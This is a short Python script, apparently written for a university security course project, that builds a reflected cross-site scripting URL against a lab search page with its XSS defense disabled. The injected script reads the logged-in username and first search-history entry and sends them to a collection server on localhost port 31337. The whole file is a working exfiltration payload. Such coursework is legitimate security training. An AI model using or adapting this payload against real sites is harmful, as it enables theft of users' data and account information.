import urllib.parse

urlRAW = "https://cs4440.eng.utah.edu/project3/search?q="
xss = "&xssdefense=0"

script = '''
<script>
window.onload = function() {
    username = document.getElementById('logged-in-user').innerHTML;
    firstSearch = document.getElementById('history-list').children[0].innerHTML;
    $.get("https://localhost:31337/", {
        stolen_user: username,
        first_search: firstSearch
    });
};
</script>
''' 
 
encoded = urllib.parse.quote(script)
final_url = urlRAW + encoded + xss

print(final_url)
